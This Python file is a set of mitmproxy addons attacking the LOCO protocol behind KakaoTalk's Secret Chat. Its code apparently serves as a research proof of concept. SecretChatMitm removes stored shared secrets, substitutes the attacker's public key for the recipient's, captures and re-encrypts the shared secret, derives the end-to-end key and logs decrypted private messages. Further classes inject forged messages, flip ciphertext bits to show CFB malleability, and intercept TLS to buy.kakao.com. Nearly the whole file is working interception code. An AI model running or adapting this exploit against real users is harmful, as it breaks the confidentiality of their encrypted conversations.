import base64
import logging

from lib.crypto_utils import get_rsa_key_pair
from lib.loco_parser import LocoParser
from mitmproxy import connection, tcp, tls
from mitmproxy.utils import human, strutils


class LocoMitmBase:
    def __init__(self, rsa_key_pair, master_secret=None, test_key=None) -> None:
        self.parser = LocoParser()
        self.rsa_key_pair = rsa_key_pair
        self.recipient_user_id = 0
        self.recipient_public_key = b""
        self.shared_secret = b""
        self.master_secret = master_secret
        self.e2e_encryption_key = test_key

    @staticmethod
    def get_addr(server: connection.Server):
        return server.peername or server.address

    def tls_clienthello(self, data: tls.ClientHelloData):
        server_address = self.get_addr(data.context.server)
        logging.info("Skip TLS intercept for %s.", human.format_address(server_address))
        data.ignore_connection = True


class SecretChatMitm(LocoMitmBase):
    def compute_e2e_encryption_key(self, shared_secret):
        if not self.e2e_encryption_key:
            self.e2e_encryption_key = self.parser.get_e2e_encryption_key(shared_secret)
            logging.info(
                "Shared secret: %s E2E encryption key: %s",
                shared_secret,
                base64.b64encode(self.e2e_encryption_key),
            )

    def tcp_message(self, flow: tcp.TCPFlow):
        message = flow.messages[-1]
        self.parser.parse(message.content)

        if self.parser.loco_packet:
            logging.info(
                "from_client=%s, content=%s",
                message.from_client,
                self.parser.loco_packet.get_packet_as_dict(),
            )
        else:
            logging.warning(
                "from_client=%s, raw packet bytes=%s",
                message.from_client,
                strutils.bytes_to_escaped_str(message.content),
            )

            return

        # If there's already a shared secret stored on the server remove it from the LOCO packet
        if not message.from_client and self.parser.loco_packet.loco_command in {
            "SCREATE",
            "CHATONROOM",
        }:
            if isinstance(self.parser.loco_packet.body_payload, bytes):
                logging.warning(
                    "Dropping %s packet as we cannot decode the packet body.",
                    self.parser.loco_packet.loco_command,
                )
                message.content = b""
                return

            tampered_packet = self.parser.remove_stored_shared_secret()

            if tampered_packet:
                message.content = tampered_packet

        # Get recipient's public key and replace it with our MITM public key
        if (
            not self.master_secret
            and not message.from_client
            and self.parser.loco_packet.loco_command
            in {"GETPK", "GETLPK", "SCREATE", "CHATONROOM"}
        ):
            logging.info("Trying to parse recipient's public key from LOCO packet...")
            (
                recipient_public_key,
                self.recipient_user_id,
                tampered_packet,
            ) = self.parser.inject_public_key(self.rsa_key_pair)

            if not recipient_public_key:
                logging.error(
                    "Could not parse recipient public key from %s packet.",
                    self.parser.loco_packet.loco_command,
                )
                return
            else:
                self.recipient_public_key = recipient_public_key

            if not self.recipient_user_id:
                logging.error(
                    "Could not parse recipient user ID from %s packet.",
                    self.parser.loco_packet.loco_command,
                )
                return

            if not tampered_packet:
                logging.error(
                    "Could not create a fake %s packet.",
                    self.parser.loco_packet.loco_command,
                )
                return

            logging.info("Injecting MITM public key...")
            message.content = tampered_packet
            # logging.info("Tampered packet: %s", self.parser.loco_packet.get_packet_as_dict())

        # Grab the shared secret from the "SETSK" packet
        if (
            self.recipient_public_key
            and not self.master_secret
            and message.from_client
            and self.parser.loco_packet.loco_command == "SETSK"
        ):
            logging.info("Trying to parse shared secret from LOCO packet...")

            shared_secret = self.parser.get_shared_secret(self.rsa_key_pair)

            if not shared_secret:
                logging.error("Couldn't parse shared secret from LOCO packet.")
                return

            self.shared_secret = shared_secret
            logging.info("Shared secret: %s", self.shared_secret)

            # Re-encrypt shared secret with the recipient's original public key
            logging.info("Trying to re-encrypt shared secret...")

            tampered_packet = self.parser.encrypt_shared_secret(
                self.shared_secret, self.recipient_public_key
            )

            if tampered_packet:
                message.content = tampered_packet
                logging.info(
                    "Re-encrypted shared secret with recipient's original public key."
                )

        # Compute E2E encryption key
        if self.shared_secret:
            self.compute_e2e_encryption_key(self.shared_secret)

        if self.master_secret:
            self.compute_e2e_encryption_key(self.master_secret)

        # Decrypt Secret Chat end-to-end encrypted message
        if self.e2e_encryption_key and (
            (message.from_client and self.parser.loco_packet.loco_command == "SWRITE")
            or (
                not message.from_client
                and self.parser.loco_packet.loco_command == "MSG"
            )
        ):
            logging.info("Trying to decrypt Secret Chat message...")
            decrypted_e2e_message = ""

            if self.master_secret:
                decrypted_e2e_message = self.parser.get_decrypted_e2e_message(
                    self.e2e_encryption_key, self.master_secret
                )
            elif self.shared_secret:
                decrypted_e2e_message = self.parser.get_decrypted_e2e_message(
                    self.e2e_encryption_key, self.shared_secret
                )

            if decrypted_e2e_message:
                logging.info(
                    "from_client=%s, Secret Chat message=%s",
                    message.from_client,
                    decrypted_e2e_message,
                )


class InjectMessage(LocoMitmBase):
    def __init__(self) -> None:
        self.parser = LocoParser()

    def tcp_message(self, flow: tcp.TCPFlow):
        message = flow.messages[-1]
        self.parser.parse(message.content)

        if self.parser.loco_packet:
            logging.info(
                "from_client=%s, content=%s",
                message.from_client,
                self.parser.loco_packet.get_packet_as_dict(),
            )
        else:
            logging.warning(
                "from_client=%s, raw packet bytes=%s",
                message.from_client,
                strutils.bytes_to_escaped_str(message.content),
            )

            return

        # Inject a new message to show that there are no integrity checks on the ciphertext
        tampered_packet = self.parser.inject_message("foo", "bar")

        if tampered_packet:
            message.content = tampered_packet


class FlipCiphertextBits(LocoMitmBase):
    def tcp_message(self, flow: tcp.TCPFlow):
        message = flow.messages[-1]
        self.parser.parse(message.content)

        if self.parser.loco_packet:
            logging.info(
                "from_client=%s, content=%s",
                message.from_client,
                self.parser.loco_packet.get_packet_as_dict(),
            )
        else:
            logging.warning(
                "from_client=%s, raw packet bytes=%s",
                message.from_client,
                strutils.bytes_to_escaped_str(message.content),
            )

            return

        # Flip bits of the ciphertext to show CFB malleability
        flipped_packet = self.parser.flip_bits()

        if flipped_packet:
            message.content = flipped_packet


class TLSIntercept:
    @staticmethod
    def get_addr(server: connection.Server):
        return server.peername or server.address

    def tls_clienthello(self, data: tls.ClientHelloData):
        if data.context.client.sni == "buy.kakao.com":
            logging.info("MITM buy.kakao.com")
            return
        else:
            server_address = self.get_addr(data.context.server)
            logging.info(
                "Skip TLS intercept for %s.", human.format_address(server_address)
            )
            data.ignore_connection = True


test_secret = b"AAAAAAAAAAAAAAAAAAAAAA=="
test_e2e_key = base64.b64decode("H1mnODpo+XZ+SEF8nR8p/ZYpNpAaLBLgB98E0tF+7Ek=")

# addons = [SecretChatMitm(rsa_key_pair=get_rsa_key_pair())]
# addons = [InjectMessage()]
# addons = [FlipCiphertextBits()]
addons = [TLSIntercept()]
